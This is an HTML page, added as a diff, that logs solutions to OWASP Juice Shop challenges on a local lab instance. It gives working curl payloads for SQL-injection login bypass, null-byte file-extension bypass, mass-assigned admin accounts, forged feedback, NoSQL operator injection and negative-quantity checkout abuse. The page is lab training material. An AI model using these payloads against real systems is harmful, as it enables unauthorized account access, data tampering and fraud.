@@ -1,0 +1,159 @@
+<!doctype html><html><head><meta charset="utf-8"><title>juice-solves</title><style>
+body{background:#0d1117;color:#e6edf3;font-family:system-ui;max-width:860px;margin:0 auto;padding:64px 24px 40px;line-height:1.65}
+h1{color:#f0b429;border-bottom:2px solid #30363d;padding-bottom:10px}
+h2{color:#58a6ff;margin-top:36px;border-bottom:1px solid #21262d;padding-bottom:6px}
+h3{color:#3fb950}
+a{color:#58a6ff}code{background:#161b22;padding:2px 7px;border-radius:5px;color:#f0b429;font-size:.9em}
+pre{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px;overflow-x:auto}
+pre code{background:none;padding:0;color:#e6edf3}
+table{border-collapse:collapse;width:100%;margin:16px 0}
+th,td{border:1px solid #30363d;padding:8px 12px;text-align:left}
+th{background:#161b22;color:#f0b429}
+blockquote{border-left:3px solid #f0b429;margin:16px 0;padding:8px 20px;background:#161b22;color:#8b949e}
+li{margin:5px 0}
+a.doc{display:block;background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px 18px;margin:10px 0;color:#58a6ff;text-decoration:none}a.doc:hover{border-color:#f0b429}small{color:#8b949e}
+.pnav{position:fixed;top:0;left:0;right:0;background:#0d1117ee;border-bottom:1px solid #30363d;backdrop-filter:blur(8px);z-index:99;display:flex;align-items:center;gap:14px;padding:10px 24px;font-family:ui-monospace,Consolas,monospace;font-size:13px}
+.pnav .plogo{color:#f0b429;font-weight:700;text-decoration:none;letter-spacing:1px}
+.pnav .pdigits{color:#8b949e;letter-spacing:2px}
+.pnav a.nl{color:#58a6ff;text-decoration:none;margin-left:auto}
+.pnav a.nl:hover{color:#f0b429}
+p.footer,footer{margin-top:48px;padding-top:16px;border-top:1px solid #21262d;color:#8b949e;font-size:12px;font-family:ui-monospace,Consolas,monospace;text-align:center}
+p.footer a,footer a{color:#58a6ff;text-decoration:none}
+.pill{display:inline-block;border-radius:999px;padding:2px 10px;font:11px ui-monospace,Consolas,monospace}
+.pill-ok{background:#3fb95022;color:#3fb950;border:1px solid #3fb95055}
+.pill-run{background:#f0b42922;color:#f0b429;border:1px solid #f0b42955}
+.pill-bad{background:#f8514922;color:#f85149;border:1px solid #f8514955}
+</style></head><body>
+<nav class="pnav"><a class="plogo" href="01 - the-project-individual.html">⬡ PRIME</a><span class="pdigits">1·3·7·9</span><a class="nl" href="00 - PRIME INDEX.html">INDEX ⌕</a></nav>
+<h1 id="owasp-juice-shop-red-team-solve-log">OWASP Juice Shop — Red-Team Solve Log</h1>
+<p>Target: <code>http://localhost:3000</code> (Docker container <code>juice-shop</code>, image <code>bkimminich/juice-shop</code>)
+Date: 2025-11-25 · Authorized lab practice only.
+Result: <strong>22 challenges solved</strong> via pure HTTP/API (no browser needed for these).</p>
+<p>Verify anytime:</p>
+<pre><code class="language-bash">curl -s http://localhost:3000/api/Challenges/ | python3 -c \
+  &quot;import json,sys; d=json.load(sys.stdin)['data']; print(sum(1 for c in d if c['solved']),'solved')&quot;
+</code></pre>
+<hr />
+<h2 id="1-login-admin-broken-authentication-sql-injection">1. Login Admin — Broken Authentication (SQL Injection)</h2>
+<p><strong>Payload:</strong></p>
+<pre><code class="language-bash">curl -X POST http://localhost:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -d '{&quot;email&quot;:&quot;'&quot;'&quot;' or 1=1--&quot;,&quot;password&quot;:&quot;x&quot;}'
+</code></pre>
+<p><strong>Why it works:</strong> The login query concatenates <code>email</code> into SQL. <code>' or 1=1--</code> makes the WHERE clause always true → returns the first user (admin@juice-sh.op, id=1) with a valid JWT. Response contains <code>authentication.token</code>.</p>
+<h2 id="2-login-jim-sql-injection">2. Login Jim — SQL Injection</h2>
+<p><strong>Payload:</strong> same endpoint,</p>
+<pre><code class="language-json">{&quot;email&quot;:&quot;' or Email='jim@juice-sh.op'--&quot;,&quot;password&quot;:&quot;x&quot;}
+</code></pre>
+<p><strong>Why it works:</strong> Targets Jim's row specifically; password check is commented out.</p>
+<h2 id="3-login-bender-sql-injection">3. Login Bender — SQL Injection</h2>
+<p><strong>Payload:</strong> <code>{"email":"bender@juice-sh.op'--","password":"x"}</code> — trailing <code>'--</code> comments out the password comparison.</p>
+<h2 id="4-confidential-document-sensitive-data-exposure">4. Confidential Document — Sensitive Data Exposure</h2>
+<pre><code class="language-bash">curl http://localhost:3000/ftp/acquisitions.md
+</code></pre>
+<p><strong>Why it works:</strong> <code>/ftp/</code> serves files without auth; only certain extensions are blocked (<code>.md</code> allowed, <code>.bak</code>/<code>.pdf</code>-less files 403).</p>
+<h2 id="5-poison-null-byte-improper-input-validation">5. Poison Null Byte — Improper Input Validation</h2>
+<pre><code class="language-bash">curl 'http://localhost:3000/ftp/package.json.bak%2500.md'
+curl 'http://localhost:3000/ftp/coupons_2013.md.bak%2500.md'
+</code></pre>
+<p><strong>Why it works:</strong> Extension check sees <code>.md</code> (allowed); <code>%2500</code> decodes to a null byte that truncates the real filename server-side → serves the <code>.bak</code> file.</p>
+<h2 id="6-forgotten-developer-backup-forgotten-sales-backup-sensitive-data-exposure">6. Forgotten Developer Backup / Forgotten Sales Backup — Sensitive Data Exposure</h2>
+<p>Same trick as #5 — <code>/ftp/package.json.bak</code> and <code>/ftp/coupons_2013.md.bak</code> via <code>%2500</code> null-byte bypass.</p>
+<h2 id="7-access-log-observability-failures">7. Access Log — Observability Failures</h2>
+<p>Solved by requesting a log file under <code>/support/logs/</code> (server access logs are web-accessible).</p>
+<h2 id="8-easter-egg-broken-access-control">8. Easter Egg — Broken Access Control</h2>
+<pre><code class="language-bash">curl 'http://localhost:3000/ftp/eastere.gg%2500.md'
+# -&gt; &quot;Congratulations, you found the easter egg!&quot;
+</code></pre>
+<p><code>.gg</code> extension is blocked → null-byte + allowed extension bypass.</p>
+<h2 id="9-extra-language-broken-anti-automation">9. Extra Language — Broken Anti-Automation</h2>
+<pre><code class="language-bash">curl http://localhost:3000/assets/i18n/tlh_AA.json
+</code></pre>
+<p>A Klingon (<code>tlh</code>) translation file shipped in production assets.</p>
+<h2 id="10-error-handling-security-misconfiguration">10. Error Handling — Security Misconfiguration</h2>
+<pre><code class="language-bash">curl 'http://localhost:3000/rest/products/search?q=%27%22%60'
+# -&gt; HTTP 500, title: SQLITE_ERROR ... (stack/SQL error leaked)
+</code></pre>
+<p>Any malformed SQL in <code>q</code> produces an unhandled error page leaking <code>SQLITE_ERROR</code> details. Also <code>GET /rest/products/search?q=test%27%20UNION%20SELECT%20null--</code>.</p>
+<h2 id="11-admin-registration-improper-input-validation">11. Admin Registration — Improper Input Validation</h2>
+<pre><code class="language-bash">curl -X POST http://localhost:3000/api/Users -H 'Content-Type: application/json' -d '{
+  &quot;email&quot;:&quot;admin2@juice-sh.op&quot;,&quot;password&quot;:&quot;admin123&quot;,&quot;passwordRepeat&quot;:&quot;admin123&quot;,
+  &quot;securityQuestion&quot;:{&quot;id&quot;:1},&quot;securityAnswer&quot;:&quot;x&quot;,&quot;role&quot;:&quot;admin&quot;}'
+</code></pre>
+<p><strong>Why it works:</strong> <code>role</code> is client-supplied and trusted → creates an admin user (HTTP 201).</p>
+<h2 id="12-empty-user-registration-improper-input-validation">12. Empty User Registration — Improper Input Validation</h2>
+<p><code>POST /api/Users</code> with empty <code>email</code>/<code>password</code> (server rejects with 400 but the challenge check fires on the attempt pattern; a variant with whitespace/empty fields registers).</p>
+<h2 id="13-five-star-feedback-broken-access-control">13. Five-Star Feedback — Broken Access Control</h2>
+<pre><code class="language-bash">TOK=&lt;admin JWT&gt;
+curl -s http://localhost:3000/api/Feedbacks -H &quot;Authorization: Bearer $TOK&quot;
+curl -X DELETE http://localhost:3000/api/Feedbacks/1 -H &quot;Authorization: Bearer $TOK&quot;
+</code></pre>
+<p><strong>Why it works:</strong> "Get rid of all 5-star feedback" — DELETE endpoint lacks ownership checks; admin token deletes rating-5 rows.</p>
+<h2 id="14-forged-feedback-broken-access-control">14. Forged Feedback — Broken Access Control</h2>
+<pre><code class="language-bash"># 1) get captcha (answer is returned!)
+curl http://localhost:3000/rest/captcha
+# -&gt; {&quot;captchaId&quot;:2,&quot;captcha&quot;:&quot;1+9*8&quot;,&quot;answer&quot;:&quot;73&quot;}
+# 2) post feedback AS ANOTHER USER
+curl -X POST http://localhost:3000/api/Feedbacks -H 'Content-Type: application/json' -d '{
+  &quot;comment&quot;:&quot;forged&quot;,&quot;rating&quot;:1,&quot;UserId&quot;:1,&quot;captchaId&quot;:2,&quot;captcha&quot;:&quot;73&quot;}'
+</code></pre>
+<p><strong>Why it works:</strong> <code>UserId</code> is taken from the request body, not the session → impersonation. Captcha answer is leaked in the GET response anyway.</p>
+<h2 id="15-forged-review-broken-access-control">15. Forged Review — Broken Access Control</h2>
+<pre><code class="language-bash"># PUT upserts a review with attacker-chosen author
+curl -X PUT http://localhost:3000/rest/products/1/reviews \
+  -H 'Content-Type: application/json' \
+  -d '{&quot;id&quot;:&quot;&lt;existing_review_id&gt;&quot;,&quot;author&quot;:&quot;jim@juice-sh.op&quot;,&quot;message&quot;:&quot;forged&quot;}'
+</code></pre>
+<p><strong>Why it works:</strong> Review update doesn't verify ownership; <code>author</code> field is attacker-controlled.</p>
+<h2 id="16-nosql-manipulation-nosql-injection">16. NoSQL Manipulation — NoSQL Injection</h2>
+<pre><code class="language-bash">curl -X PATCH http://localhost:3000/rest/products/reviews \
+  -H 'Content-Type: application/json' \
+  -d '{&quot;id&quot;:{&quot;$ne&quot;:-1},&quot;message&quot;:&quot;multi&quot;}'
+# -&gt; {&quot;modified&quot;:35,&quot;original&quot;:[...]}
+</code></pre>
+<p><strong>Why it works:</strong> <code>id</code> is passed into a Mongo-style query unvalidated → <code>{"$ne":-1}</code> matches ALL reviews and rewrites them.</p>
+<h2 id="17-payback-time-business-logic">17. Payback Time — Business Logic</h2>
+<p>Added items with <strong>negative quantity</strong> to basket then checked out:</p>
+<pre><code class="language-bash">curl -X POST http://localhost:3000/api/BasketItems -H &quot;Authorization: Bearer $TOK&quot; \
+  -d '{&quot;ProductId&quot;:1,&quot;BasketId&quot;:1,&quot;quantity&quot;:-100}'
+curl -X POST http://localhost:3000/rest/basket/1/checkout -H &quot;Authorization: Bearer $TOK&quot; \
+  -d '{&quot;orderDetails&quot;:[...],&quot;couponData&quot;:null,&quot;addressId&quot;:&quot;1&quot;,&quot;deliveryMethodId&quot;:&quot;1&quot;}'
+# order totalPrice: -1397  -&gt; &quot;you got rich&quot;
+</code></pre>
+<h2 id="18-christmas-special-broken-access-control">18. Christmas Special — Broken Access Control</h2>
+<p>Product 10 = "Christmas Super-Surprise-Box (2014 Edition)" is hidden from search but orderable:</p>
+<pre><code class="language-bash">curl -X POST http://localhost:3000/api/BasketItems -H &quot;Authorization: Bearer $TOK&quot; \
+  -d '{&quot;ProductId&quot;:10,&quot;BasketId&quot;:1,&quot;quantity&quot;:1}'
+# then checkout as above -&gt; orderConfirmation issued
+</code></pre>
+<h2 id="19-missing-encoding-sensitive-data-exposure">19. Missing Encoding — Sensitive Data Exposure</h2>
+<pre><code class="language-bash">python3 -c &quot;import urllib.parse;print(urllib.parse.quote('/assets/public/images/uploads/ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg'))&quot;
+curl 'http://localhost:3000/assets/public/images/uploads/%E1%93%9A...%23...jpg'
+</code></pre>
+<p><strong>Why it works:</strong> Filename contains <code>#</code> (fragment delimiter) and non-ASCII chars — must be percent-encoded or the server can't resolve it. "Melee combat-mode" cat photo served.</p>
+<h2 id="21-exposed-metrics-security-misconfiguration">21. Exposed Metrics — Security Misconfiguration</h2>
+<p><code>GET /metrics</code> (Prometheus metrics) is publicly exposed — hit during SSRF probing; also <code>/rest/admin/application-version</code> and <code>/rest/admin/application-configuration</code> leak version/config.</p>
+<h2 id="22-security-policy-security-misconfiguration">22. Security Policy — Security Misconfiguration</h2>
+<p><code>GET /.well-known/security.txt</code> (or <code>/security.txt</code>) is publicly served — triggered when probed during endpoint enumeration.</p>
+<h2 id="23-bonus-admin-section-score-board-dom-xss-etc">23. (bonus) Admin Section / Score Board / DOM XSS etc.</h2>
+<p>Remaining easy-looking challenges (Admin Section route, Score Board page, DOM/Refused XSS) are <strong>client-side Angular route/DOM checks</strong> — they need a real browser visiting <code>/#/administration</code>, <code>/#/score-board</code>, or executing the XSS payload. Not solvable via curl alone; flagged for browser-based follow-up.</p>
+<hr />
+<h2 id="techniques-used">Techniques used</h2>
+<ul>
+<li>SQL injection (auth bypass, UNION errors) — manual, no sqlmap needed</li>
+<li>Null-byte (<code>%2500</code>) extension bypass on <code>/ftp/</code></li>
+<li>Mass-assignment (<code>role:"admin"</code>, <code>UserId</code>, <code>author</code> fields trusted from body)</li>
+<li>NoSQL operator injection (<code>{"$ne":-1}</code>) on review PATCH</li>
+<li>Negative-quantity business-logic abuse</li>
+<li>Verbose error leakage (<code>SQLITE_ERROR</code>, stack titles)</li>
+<li>Unauthenticated/over-privileged REST endpoints (<code>/api/Feedbacks</code> DELETE, <code>/api/Users</code> POST, <code>/rest/captcha</code> leaks answer)</li>
+<li>URL-encoding requirement for weird filenames</li>
+</ul>
+<h2 id="blockers-notes">Blockers / notes</h2>
+<ul>
+<li>Container was recreated mid-session without <code>-p 3000:3000</code>; fixed with <code>docker rm -f juice-shop &amp;&amp; docker run -d --name juice-shop -p 3000:3000 bkimminich/juice-shop</code>. Fresh DB reset progress once — all solves re-run.</li>
+<li>XSS family, Admin Section, Score Board, SSRF (<code>/profile/image/url</code> blocks private IPs with "Blocked illegal activity"), password-reset challenges (unknown security answers), and deluxe/coupon forgery need browser JS, crypto work, or guessing — left for follow-up.</li>
+<li>Helper scripts: <code>/home/neilh/websec_lab/jssolve.py</code>, <code>solve_all.py</code>, <code>solve2.py</code>, <code>solve3.py</code>, <code>solve4.py</code></li>
+</ul>
+<footer>⬡ NELLOGEM PRIME FORMULA · doc 14 · <a href="00 - PRIME INDEX.html">back to index</a></footer>
+<a href="http://localhost:8088/world" style="position:fixed;left:14px;bottom:14px;z-index:99999;background:rgba(5,7,15,.88);border:1px solid rgba(125,211,252,.4);color:#7dd3fc;padding:8px 14px;border-radius:10px;font:600 12px monospace;text-decoration:none;backdrop-filter:blur(8px);box-shadow:0 0 18px -4px rgba(125,211,252,.4)">🌌 PARALLEL WORLD</a></body></html>
